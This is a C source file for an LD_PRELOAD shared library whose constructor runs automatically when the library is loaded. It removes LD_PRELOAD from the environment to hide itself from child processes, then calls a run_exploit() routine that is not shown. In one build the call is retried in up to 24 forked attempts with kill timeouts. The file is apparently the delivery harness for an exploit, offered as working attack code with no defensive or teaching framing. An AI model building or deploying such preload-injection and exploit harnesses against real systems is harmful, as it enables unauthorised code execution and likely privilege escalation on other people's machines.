#include "common.h"

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

#if defined(APP_PAYLOAD) && APP_PAYLOAD
  for (int attempt = 1; attempt <= 24; attempt++) {
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) _exit(1);
      _exit(run_exploit(1, argv));
    }
    int status;
    time_t start = time(NULL);
    while (waitpid(child, &status, WNOHANG) == 0) {
      if (time(NULL) - start > 90) { kill(child, SIGKILL); break; }
      usleep(100000);
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) return;
    sleep(5);
  }
#else
  pr_success("minimal preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
#endif
}